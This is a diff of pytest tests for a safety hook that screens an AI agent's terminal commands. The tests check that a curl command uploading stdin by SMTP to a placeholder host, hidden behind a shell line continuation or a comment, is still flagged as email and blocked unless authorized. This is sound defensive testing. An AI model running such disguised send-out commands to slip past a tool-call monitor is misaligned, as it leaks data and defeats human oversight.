@@ -41,12 +41,12 @@ def test_large_unmatched_escape_runs_are_linear(tmp_path, marker):
 @pytest.mark.parametrize("shell,continuation", [("bash", chr(92) + "\n"),
                                                 ("powershell", chr(96) + "\n"),
                                                 ("powershell", chr(96) + "\r\n")])
-def test_known_shell_benign_echo_and_unknown_shell_ambiguity(tmp_path, shell, continuation):
+def test_ambiguous_physical_command_boundary(tmp_path, shell, continuation):
     rails = load(tmp_path)
     command = "echo " + continuation + " curl --url smtp://example.invalid -T -"
-    assert rails._terminal_area(command, shell) is None
-    # Another shell can interpret the physical newline as an actual command
-    # boundary, so a generic terminal must not discard that interpretation.
+    # The safety fallback preserves physical boundaries even for known shells.
+    # Without full shell parsing an apparent continuation can be in a comment.
+    assert rails._terminal_area(command, shell) == "email"
     assert rails._terminal_area(command) == "email"
 
 
@@ -65,3 +65,24 @@ def test_bash_crlf_is_not_a_continuation(tmp_path):
     command = "curl " + chr(92) + "\r\n --url smtp://example.invalid -T -"
     assert rails._terminal_area(command, "bash") is None
     assert rails._join_shell_continuations(command, "bash") == command
+
+
+@pytest.mark.parametrize("tool", ["bash", "terminal", "shell", "powershell"])
+@pytest.mark.parametrize("ending", ["\n", "\r\n"])
+@pytest.mark.parametrize("verdict", ["no", "unsure", "down", "yes", "shadow"])
+def test_comment_continuation_cannot_hide_email(tmp_path, monkeypatch, tool, ending, verdict):
+    rails, ctx, _ = _cua_setup(tmp_path, monkeypatch, mode="off")
+    seen = _install(rails, p={"no": 0.1, "unsure": 0.5, "yes": 0.91}.get(verdict, 0.1),
+                    boom=verdict == "down")
+    if verdict == "shadow":
+        rails.MONEY_EMAIL_MODE = "shadow"
+    marker = chr(96) if tool == "powershell" else chr(92)
+    command = "echo ready # " + marker + ending + "curl --url smtp://example.invalid -T -"
+    assert rails._terminal_area(command, tool) == "email"
+    result = ctx.hooks["pre_tool_call"](tool_name=tool, args={"command": command},
+                                       session_id="s", turn_id="t1")
+    assert [call for call in seen if "authorize" in call] == [["authorize"]]
+    if verdict in {"yes", "shadow"}:
+        assert result is None
+    else:
+        assert result and result["action"] == "block"
